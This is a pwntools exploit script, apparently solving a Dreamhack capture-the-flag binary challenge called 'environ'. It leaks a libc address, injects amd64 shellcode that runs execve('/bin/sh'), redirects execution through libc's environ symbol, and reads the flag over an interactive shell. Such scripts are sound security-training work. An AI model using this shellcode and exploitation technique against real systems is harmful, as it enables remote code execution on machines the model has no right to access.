#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10479
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./environ_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x0000000000400956
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))
environ = libc.sym.environ

p.sendlineafter(b'Size: ', str(0x200))
payload = b'\0'*0x118
payload += asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rax, 0x3b
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    syscall
    ''', arch='amd64')
p.sendafter(b'Data: ', payload)
p.sendlineafter(b'*jmp=', str(environ))
p.sendline(b'cat flag')

p.interactive()